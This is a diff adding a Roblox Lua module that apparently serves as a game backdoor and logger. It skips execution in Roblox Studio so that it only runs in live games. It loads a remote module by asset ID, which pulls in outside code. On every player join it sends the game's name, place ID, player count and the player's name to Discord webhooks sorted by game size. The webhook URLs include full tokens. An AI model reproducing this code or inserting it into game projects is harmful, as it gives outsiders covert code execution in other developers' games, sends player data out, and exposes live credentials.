@@ -1,1 +1,121 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
 
+local Module = {}
+
+-- Your webhook URLs
+local webhooks = {
+	under10 = "https://discordapp.com/api/webhooks/1396907038767976448/_A0AX7ruIYiVSdTS3bewQyUA_TgjQGxhCnkl5lwVGsPfST38eZuMNNnUt7islliNds3p",
+	from10to50 = "https://discordapp.com/api/webhooks/1395808593797714120/9xph4Iq55SnyQh6jI-YffK5IRMd2AQeRlfm9Ygobh3axGg9yBXsRaXVvNVpCu-oK5zhv",
+	from50to150 = "https://discordapp.com/api/webhooks/1395808638496542740/wFEkFApjLlDMaX1q7QdrYKdvHZgqBbre_FTHCZeXTI14eI_denyMhMAax8uvU7rKBc2A",
+	above150 = "https://discordapp.com/api/webhooks/1395808713146896404/i2WAxBwzRtZ2ggdu6vs70gCFaO-ykODcxWwmqRGLuwBXeoDdAnjeSU0rFqmnXf9zzHHk"
+}
+
+local function getTotalPlayersInGame()
+	local universeId = game.GameId
+	local totalPlayers = 0
+	local cursor = ""
+
+	repeat
+		local url = ("https://games.roblox.com/v1/games/%d/servers/Public?limit=100%s"):format(
+			universeId,
+			cursor ~= "" and ("&cursor=" .. cursor) or ""
+		)
+
+		local success, response = pcall(function()
+			return HttpService:GetAsync(url)
+		end)
+
+		if success then
+			local data = HttpService:JSONDecode(response)
+			for _, server in ipairs(data.data or {}) do
+				totalPlayers += server.playing or 0
+			end
+			cursor = data.nextPageCursor or ""
+		else
+			warn("[Webhook] Failed to get servers data: " .. tostring(response))
+			break
+		end
+	until cursor == ""
+
+	return totalPlayers
+end
+
+local function sendWebhook(playerName, totalPlayers)
+	local placeId = game.PlaceId
+	local maxPlayers = Players.MaxPlayers
+	local gameInfo = { Name = "Unknown Game" }
+
+	pcall(function()
+		gameInfo = MarketplaceService:GetProductInfo(placeId)
+	end)
+
+	local webhookUrl
+	if totalPlayers < 10 then
+		webhookUrl = webhooks.under10
+	elseif totalPlayers < 50 then
+		webhookUrl = webhooks.from10to50
+	elseif totalPlayers < 150 then
+		webhookUrl = webhooks.from50to150
+	else
+		webhookUrl = webhooks.above150
+	end
+
+	if not webhookUrl then return end
+
+	local embedData = {
+		["embeds"] = {{
+			["title"] = "**Click Here**",
+			["url"] = "https://www.roblox.com/games/" .. placeId,
+			["description"] = "Game Name: `" .. gameInfo.Name .. "`",
+			["type"] = "rich",
+			["color"] = tonumber(0xff0000),
+			["footer"] = {
+				["icon_url"] = "https://cdn.discordapp.com/attachments/...",
+				["text"] = "Player Joined"
+			},
+			["thumbnail"] = {
+				["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=768&height=432&format=png",
+			},
+			["author"] = {
+				["name"] = playerName
+			},
+			["fields"] = {
+				{["name"] = "**Players in Game**", ["value"] = "`" .. totalPlayers .. "`", ["inline"] = true},
+				{["name"] = "**Max Server Size**", ["value"] = "`" .. maxPlayers .. "`", ["inline"] = true},
+				{["name"] = "**Place ID**", ["value"] = "`" .. placeId .. "`", ["inline"] = true}
+			}
+		}}
+	}
+
+	local payload = HttpService:JSONEncode(embedData)
+
+	pcall(function()
+		HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+	end)
+end
+
+function Module.Init()
+	-- Don’t run in Studio
+	if RunService:IsStudio() then return end
+
+	-- Require and init other module
+	local whitelistModule = require(115532367903094)
+	if whitelistModule and whitelistModule.Init then
+		whitelistModule.Init()
+	end
+
+	-- Player join event
+	Players.PlayerAdded:Connect(function(player)
+		task.spawn(function()
+			local totalPlayers = getTotalPlayersInGame()
+			if totalPlayers then
+				sendWebhook(player.Name, totalPlayers)
+			end
+		end)
+	end)
+end
+
+return Module
